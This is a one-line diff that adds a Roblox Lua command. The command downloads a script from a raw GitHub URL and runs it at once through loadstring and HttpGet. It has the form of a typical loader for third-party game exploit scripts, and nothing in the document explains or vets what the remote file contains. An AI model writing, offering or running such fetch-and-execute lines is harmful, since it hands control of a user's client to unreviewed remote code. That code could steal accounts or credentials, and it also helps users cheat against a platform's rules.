@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Functionadvance/Advant-phts/refs/heads/main/Sdda.py"))();
